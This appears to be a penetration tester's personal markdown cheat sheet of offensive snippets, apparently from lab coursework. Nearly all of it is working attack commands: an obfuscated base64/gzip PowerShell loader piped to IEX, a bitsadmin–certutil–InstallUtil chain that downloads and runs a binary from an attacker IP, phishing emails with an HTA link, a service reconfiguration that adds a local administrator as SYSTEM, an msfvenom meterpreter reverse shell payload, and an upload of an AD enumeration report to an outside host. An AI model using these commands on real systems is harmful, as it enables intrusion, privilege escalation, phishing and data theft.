# Snippets

Unsorted code snippets that dont really have a home elsewhere


Gzip and Base64 encode Powershell strings and script and execute
- https://www.zickty.com/texttogzip
- https://gchq.github.io/CyberChef/#recipe=Gzip('Dynamic%20Huffman%20Coding','','',false)To_Base64('A-Za-z0-9%2B/%3D')&input=d2hvYW1pIC9hbGw&oeol=FF

```powershell
$b = 'H4sIAAAAAAAAAyvPyE/MzQQAAirKwAYAAAA='
$g = [System.Convert]::FromBase64String($b)
$m = New-Object System.IO.MemoryStream(, $g)
$d = New-Object System.IO.MemoryStream
$z = New-Object System.IO.Compression.GZipStream($m, [IO.Compression.CompressionMode]::Decompress)
$z.CopyTo($d)
$d.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
$r = New-Object System.IO.StreamReader($d)
$s = $r.ReadToEnd()
$s | IEX
```

LOLBINS, Download and execute into InstallUtil

```
# Encode binary / file with certutil.exe
certutil -encode C:\Users\Hacker\Source\Repos\IgnoreCLM\IgnoreCLM\bin\x64\Release\IgnoreCLM.exe Data.txt

# Downloads with bitsadmin, decode with certutil back into a binary and execute with InstallUtils.
bitsadmin /Transfer myJob http://192.168.45.216/Data.txt C:\users\student\Data.txt && timeout /t 1 /nobreak >nul && certutil -decode C:\users\student\Data.txt C:\users\student\Data.exe && timeout /t 1 /nobreak >nul && del C:\users\student\Data.txt && timeout /t 1 /nobreak >nul && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U "C:\users\student\Data.exe"
```
Send email to target 
``` bash
# swaks
swaks --body 'Free Loot --> http://192.168.45.170/PHP/test.hta' --add-header "Want sum loot?" --add-header "Content-Type: text/html" --header "Subject: Free loot" -t user@domain.com -f Shell@security.local --server 192.168.226.159

# sendmail
sendemail -t user@domain.com  -f Shell@security.local -s 192.168.226.159 -m "This is the main email body" -u "This is the subject line" -a /home/kali/Doc1.doc
```
Configure service to run a custom command. Explicity setting to run under SYSTEM
```
sc.exe config SNMPTRAP binpath= "net localgroup Administrators domain.local\user /add" obj= "LocalSystem"
```
use nc to scan all local ports
```
for port in {1..65535}; do nc -zv 127.0.0.1 $port 2>&1 | grep succeeded; done
```
auto migrate with metasploit
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.154 LPORT=8080 -f csharp prependmigrateproc=explorer.exe prependmigrate=true
```
POST files to web server such as HFS.
```powershell
$f= "C:\pentest\ADenum_Report.html" ; $u= "http://192.168.45.194/Uploads/" ; $w= New-Object System.Net.WebClient ; $r= $w.UploadFile($u, "POST", $f)
```
